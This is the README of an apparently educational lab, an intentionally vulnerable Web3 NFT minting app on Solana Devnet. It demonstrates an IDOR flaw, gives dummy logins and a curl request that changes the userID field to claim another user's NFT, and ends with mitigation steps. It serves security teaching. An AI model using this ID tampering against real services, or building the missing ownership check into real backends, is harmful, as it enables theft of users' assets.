# 🛡️ Web3 NFT Minting Lab — IDOR Vulnerability Demonstration

## 🎯 Lab Objective

This lab demonstrates how **classic Web2 vulnerabilities such as IDOR (Insecure Direct Object Reference)** can still be exploited in modern Web3-like applications — particularly in systems that **interact with blockchains but rely on off-chain logic**.

Here, you are presented with an NFT minting interface, resembling a "rewards screen" where users claim blockchain-based assets. However, due to **missing backend ownership validation**, an attacker can manipulate a request and **steal NFTs that belong to other users**.

> ✅ While the application simulates a simple NFT minting dApp, the vulnerability is real and exploitable — making it a valuable learning scenario for developers, pentesters, and blockchain security enthusiasts.

---

## ⚒️ Technical Summary

- **Vulnerability Type**: IDOR (Insecure Direct Object Reference)
- **Environment**: Solana Devnet
- **Impact**: Unauthorized NFT claiming (asset theft)
- **Exploit Method**: Tampering with the `userID` field in the mint request
- **Authentication**: Dummy credentials (no real user accounts)
- **Blockchain Ops**: NFT minting & transfer performed live on **Solana Devnet**

---

## 📦 Project Structure

The project is organized into the following main directories:

| Folder            | Description                                                                                                                                                                                            |
| ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`backend/`**    | Express.js API responsible for NFT minting and Solana blockchain interaction. Uses a predefined wallet to sign transactions. All minting & transfer operations are performed on the **Solana Devnet**. |
| **`frontend/`**   | React.js-based web app where users log in, connect their wallets, and interact with NFTs. Displays user-specific NFTs (dummy data) and allows minting.                                                 |
| **`deployment/`** | Docker and Docker Compose configuration to spin up the full environment.                                                                                                                               |
| **`wallet/`**     | Includes a Solana wallet keypair used by the backend for signing transactions. **Do not share this keypair in production environments.**                                                               |

> 💡 Although users and NFTs are mocked, minting and transferring NFTs **does occur live** on Solana's devnet.

---

## 🚀 Getting Started

You can launch the project using Docker Compose or the Makefile. Ensure you have **Docker**, **Make**, and **npm** installed.

### 🔧 Option 1: Docker Compose

From the project root, run:

```bash
docker compose -f ./deployment/dev.docker-compose.yml up --build
```

> ⏱️ This process may take up to **10 minutes** to fully initialize all containers and network connections (especially Solana devnet dependencies).

---

### ⚙️ Option 2: Makefile

Use the `Makefile` as a simpler shortcut:

```bash
make dev
```

This wraps the same Docker process under the hood and sets up the environment.

---

### 🔨 Install Frontend Dependencies

If you prefer running the frontend locally (React app), navigate to the `frontend/` directory and run the following command to install required dependencies:

```bash
cd frontend
npm install
```

---

### 🔨 Install Backend Dependencies

If you prefer running the backend locally (Express API), navigate to the `backend/` directory and run the following command to install required dependencies:

```bash
cd backend
npm install
```

---

## 🔓 Logging In

Use one of the following dummy credentials:

```
solninja:pass1
solwave:pass2
solbird:pass3
solcore:pass4
```

After logging in, you’ll be redirected to a dashboard where your available NFTs (dummy data) will be shown. If a mintable NFT is assigned to you, a **"Mint NFT"** button will appear.

---

## 🧪 How the Vulnerability Works

### 📤 Normal Behavior

When clicking **"Mint NFT"**, the frontend sends a POST request to the backend:

```json
{
  "userID": 1,
  "nftID": 2,
  "publicKey": "Your_Solana_Wallet_PublicKey"
}
```

The backend then:

1. Mints the specified NFT (real minting on Solana Devnet),
2. Transfers it to the given wallet `publicKey`.

---

### 🚨 Exploitation via IDOR

The backend **does not verify** if the `userID` in the request matches the currently authenticated user. This creates an IDOR vulnerability.

#### Attack Scenario

1. Login with your account (`solninja`)
2. Intercept the mint request
3. Modify the request body:
   - Change `userID` to another user's ID (e.g., `2`)
   - Keep your own `publicKey`
4. Send the request

Now, **you will receive an NFT that doesn’t belong to you.**

---

### 🧰 Exploitation with cURL

```bash
curl -X POST http://localhost/api/nft/mint/demo \
  -H "Content-Type: application/json" \
  -d '{
    "userID": 2,
    "nftID": 2,
    "publicKey": "Your_Own_Solana_Public_Key"
  }'
```

This will mint the NFT owned by `userID: 2` to **your** wallet address.

---

## ✅ Conclusion

This lab proves that:

- Blockchain immutability doesn’t mean immunity.
- Traditional Web2 flaws like IDOR are still relevant in Web3-style platforms.
- Authorization checks on off-chain logic are just as important as on-chain integrity.

Even if a transaction is correctly processed on-chain, it can **still be a malicious transaction** if the backend logic is flawed.

---

## 🔒 How to Prevent This (Mitigation Steps)

To secure similar systems:

1. **Enforce Backend Authorization**  
   Ensure that the backend always validates whether the authenticated user has permission to perform actions involving `userID`, `nftID`, or other sensitive identifiers.

2. **Bind NFT Ownership to Logged-in User**  
   Avoid sending user IDs from the frontend. Derive the user identity from the authentication session/token on the backend side.

3. **Use Middleware Authorization Guards**  
   Apply access control middleware (e.g., JWT/session-based) that checks the legitimacy of requests before proceeding.

4. **Log Suspicious Behavior**  
   Monitor and alert on abnormal minting patterns — e.g., multiple mint requests with changing `userID` and the same `publicKey`.

5. **Separate Client-Controlled and Server-Controlled Data**  
   Treat any frontend-provided data as untrusted. Always verify ownership and permissions server-side.

---

## 🧠 Final Thoughts

By showcasing this vulnerability in a **hands-on Web3 scenario**, this lab bridges the gap between traditional security knowledge and decentralized app development. It highlights the critical need to apply **zero trust principles** and secure coding practices in all layers — whether on-chain or off-chain.

## 📚 References

- Solana Devnet Docs - https://docs.solana.com/clusters#devnet
- Solana General Docs - https://solana.com/tr/docs
- Solana CLI Tool Docs - https://solana.com/tr/docs/intro/installation
- NFT minting example based on - https://github.com/metaplex-foundation/js-examples
- OWASP Top 10 - https://owasp.org/www-project-top-ten/


